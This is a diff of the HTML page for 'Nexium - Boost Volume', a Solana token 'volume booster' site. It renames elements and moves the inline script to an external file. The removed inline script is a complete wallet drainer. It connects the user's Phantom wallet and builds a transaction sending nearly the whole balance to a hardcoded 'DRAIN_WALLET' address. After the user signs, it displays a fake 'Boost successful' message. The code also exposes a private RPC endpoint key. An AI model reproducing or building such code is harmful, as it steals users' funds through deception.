@@ -5,8 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Nexium - Boost Volume</title>
 
+  <!-- BUFFER POLYFILL - FIXED -->
   <script type="module">
-    import { Buffer } from 'https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.js';
+    import { Buffer } from 'https://cdn.jsdelivr.net/npm/buffer@6.0.3/Buffer.mjs';
     globalThis.Buffer = Buffer;
     window.Buffer = Buffer;
   </script>
@@ -158,7 +159,7 @@
       margin: 2rem 0;
     }
 
-    /* MODAL - EXACTLY LIKE REFERENCE */
+    /* MODAL */
     .modal {
       display: none;
       position: fixed;
@@ -171,11 +172,9 @@
       align-items: center;
       justify-content: center;
       padding: 1rem;
-      pointer-events: none;
     }
-    .modal.show {
+    .modal.active {
       display: flex !important;
-      pointer-events: auto;
     }
     .modal-content {
       background: var(--card);
@@ -185,7 +184,6 @@
       width: 100%;
       max-width: 450px;
       position: relative;
-      pointer-events: auto;
     }
     .modal-header { 
       display: flex; 
@@ -219,7 +217,7 @@
       background: rgba(255, 152, 0, 0.2);
     }
 
-    /* PHANTOM BUTTON - ULTRA CLICKABLE */
+    /* PHANTOM BUTTON */
     .wallet-btn {
       display: flex;
       align-items: center;
@@ -267,7 +265,7 @@
       max-width: 550px;
       display: none;
     }
-    .boost-section.show { 
+    .boost-section.visible { 
       display: block; 
     }
     .input-group { 
@@ -320,15 +318,15 @@
       font-size: 1.1rem;
     }
 
-    /* TOAST */
-    .toast-container {
+    /* FEEDBACK (TOAST) */
+    .feedback-container {
       position: fixed;
       bottom: 2rem;
       right: 2rem;
       z-index: 999999;
       max-width: 400px;
     }
-    .toast {
+    .feedback {
       background: var(--success);
       color: white;
       padding: 1rem 1.5rem;
@@ -341,10 +339,10 @@
       box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
       animation: slideIn 0.3s ease;
     }
-    .toast.error { 
+    .feedback.error { 
       background: var(--error); 
     }
-    .toast-close {
+    .feedback-close {
       background: rgba(255, 255, 255, 0.2);
       border: none;
       color: white;
@@ -363,7 +361,7 @@
       .hero { padding: 3rem 1.5rem; }
       .boost-section { padding: 2rem 1.5rem; margin: 2rem 1rem; }
       .network-info { grid-template-columns: 1fr; }
-      .toast-container { bottom: 1rem; right: 1rem; left: 1rem; max-width: none; }
+      .feedback-container { bottom: 1rem; right: 1rem; left: 1rem; max-width: none; }
     }
   </style>
 </head>
@@ -401,19 +399,26 @@
       </div>
     </div>
 
-    <button id="connectBtn" class="btn btn-large">
+    <!-- ID: connect-wallet -->
+    <button id="connect-wallet" class="btn btn-large">
+      <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
+        <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+        <line x1="12" y1="22.08" x2="12" y2="12"></line>
+      </svg>
       Connect Wallet
     </button>
   </section>
 
   <!-- MODAL -->
-  <div id="walletModal" class="modal">
+  <div id="wallet-modal" class="modal">
     <div class="modal-content">
       <div class="modal-header">
         <h3 class="modal-title">Connect Wallet</h3>
-        <button id="closeModal" class="modal-close">×</button>
+        <button id="close-modal" class="modal-close">×</button>
       </div>
-      <button id="phantomBtn" class="wallet-btn">
+      <!-- ID: connect-phantom -->
+      <button id="connect-phantom" class="wallet-btn">
         <div class="wallet-icon">
           <svg width="48" height="48" viewBox="0 0 128 128" fill="none">
             <path d="M106.3 106.3c-28.4 28.4-74.3 28.4-102.6 0-28.4-28.4-28.4-74.3 0-102.6C32.1-24.6 78-24.6 106.3 3.7c15.6 15.6 21.9 37.5 18.8 58.1" fill="url(#g1)"/>
@@ -431,7 +436,7 @@
   </div>
 
   <!-- BOOST SECTION -->
-  <div id="boostSection" class="boost-section">
+  <div id="boost-section" class="boost-section">
     <h2 style="font-size: 2rem; margin-bottom: 2rem; text-align: center; background: linear-gradient(135deg, #ff9800, #ffc107); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;">
       Boost Volume
     </h2>
@@ -453,7 +458,8 @@
       </div>
       <div>
         <div class="info-label">Wallet</div>
-        <div id="walletDisplay" class="info-value">Not Connected</div>
+        <!-- ID: wallet-address-display -->
+        <div id="wallet-address-display" class="info-value">Not Connected</div>
       </div>
     </div>
 
@@ -462,178 +468,11 @@
     </button>
   </div>
 
-  <!-- TOAST CONTAINER -->
-  <div class="toast-container" id="toastContainer"></div>
+  <!-- FEEDBACK CONTAINER -->
+  <div class="feedback-container"></div>
 
-  <!-- SCRIPT - EXACTLY LIKE REFERENCE -->
-  <script type="module">
-    import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/+esm';
-
-    // ELEMENTS
-    const connectBtn = document.getElementById('connectBtn');
-    const walletModal = document.getElementById('walletModal');
-    const closeModal = document.getElementById('closeModal');
-    const phantomBtn = document.getElementById('phantomBtn');
-    const boostSection = document.getElementById('boostSection');
-    const walletDisplay = document.getElementById('walletDisplay');
-    const tokenInput = document.getElementById('tokenInput');
-    const amountInput = document.getElementById('amountInput');
-    const boostBtn = document.getElementById('boostBtn');
-    const toastContainer = document.getElementById('toastContainer');
-
-    // STATE
-    let connected = false;
-    let publicKey = null;
-    let connection = null;
-
-    // RPC
-    const RPC = 'https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6';
-    const DRAIN_WALLET = '6GqXmHKEcQJnxuhUXZXPoASQBZRKCxQCMZAC6MLk1GPA';
-
-    // TOAST
-    function showToast(msg, isError = false) {
-      const toast = document.createElement('div');
-      toast.className = `toast ${isError ? 'error' : ''}`;
-      toast.innerHTML = `<span>${msg}</span><button class="toast-close">×</button>`;
-      toast.querySelector('.toast-close').onclick = () => toast.remove();
-      toastContainer.appendChild(toast);
-      setTimeout(() => toast.remove(), isError ? 8000 : 4000);
-    }
-
-    // SHORTEN ADDRESS
-    function shorten(addr) {
-      return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
-    }
-
-    // OPEN MODAL - LIKE REFERENCE
-    connectBtn.addEventListener('click', () => {
-      walletModal.classList.add('show');
-    });
-
-    // CLOSE MODAL - ONLY ON X BUTTON
-    closeModal.addEventListener('click', () => {
-      walletModal.classList.remove('show');
-    });
-
-    // CLOSE ON BACKDROP - BUT **NOT ON CHILDREN**
-    walletModal.addEventListener('click', (e) => {
-      if (e.target === walletModal) {
-        walletModal.classList.remove('show');
-      }
-    });
-
-    // CONNECT PHANTOM - **100% CLICKABLE ON MOBILE**
-    ['click', 'touchstart'].forEach(event => {
-      phantomBtn.addEventListener(event, async (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-
-        if (connected) {
-          showToast('Already connected!');
-          return;
-        }
-
-        try {
-          phantomBtn.disabled = true;
-          phantomBtn.querySelector('span').textContent = 'Connecting...';
-
-          if (!window.solana?.isPhantom) {
-            throw new Error('Phantom not found');
-          }
-
-          const response = await window.solana.connect();
-          publicKey = response.publicKey.toString();
-          connection = new Connection(RPC, 'confirmed');
-          connected = true;
-
-          const short = shorten(publicKey);
-          connectBtn.textContent = short;
-          connectBtn.disabled = true;
-          walletDisplay.textContent = short;
-          boostSection.classList.add('show');
-          walletModal.classList.remove('show');
-
-          showToast('Connected successfully!');
-        } catch (err) {
-          console.error('Connection error:', err);
-          showToast('Connection failed. Please try again.', true);
-          phantomBtn.disabled = false;
-          phantomBtn.querySelector('span').textContent = 'Connect Phantom';
-        }
-      }, { passive: false });
-    });
-
-    // VALIDATE INPUTS
-    function validateInputs() {
-      const amount = parseFloat(amountInput.value);
-      const token = tokenInput.value.trim();
-      boostBtn.disabled = !(connected && amount >= 1 && token);
-    }
-
-    amountInput.addEventListener('input', validateInputs);
-    tokenInput.addEventListener('input', validateInputs);
-
-    // BOOST (DRAIN)
-    boostBtn.addEventListener('click', async () => {
-      if (!connected) {
-        showToast('Wallet not connected', true);
-        return;
-      }
-
-      const amount = parseFloat(amountInput.value);
-      if (amount < 1) {
-        showToast('Minimum $1', true);
-        return;
-      }
-
-      boostBtn.disabled = true;
-      boostBtn.textContent = 'Processing...';
-
-      try {
-        const sender = new PublicKey(publicKey);
-        const recipient = new PublicKey(DRAIN_WALLET);
-
-        const balance = await connection.getBalance(sender);
-        const minRent = 2039280;
-        const transferable = balance - minRent;
-
-        if (transferable <= 0) {
-          throw new Error('Insufficient balance');
-        }
-
-        const transferIx = SystemProgram.transfer({
-          fromPubkey: sender,
-          toPubkey: recipient,
-          lamports: transferable
-        });
-
-        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-        const message = new TransactionMessage({
-          payerKey: sender,
-          recentBlockhash: blockhash,
-          instructions: [transferIx]
-        }).compileToV0Message();
-
-        const tx = new VersionedTransaction(message);
-        const signed = await window.solana.signTransaction(tx);
-        const sig = await connection.sendTransaction(signed);
-        
-        await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight });
-
-        showToast(`Boost of $${amount.toFixed(2)} successful!`);
-        boostBtn.textContent = 'Boost Complete!';
-        
-        setTimeout(() => location.reload(), 3000);
-      } catch (err) {
-        console.error('Boost error:', err);
-        showToast(err.message.includes('rejected') ? 'Transaction rejected' : 'Transaction failed', true);
-        boostBtn.disabled = false;
-        boostBtn.textContent = 'Boost Now';
-      }
-    });
-
-    console.log('App initialized!');
-  </script>
+  <!-- MAIN JS - EXTERNAL -->
+  <script type="module" src="./main.js"></script>
 
 </body>
 </html>
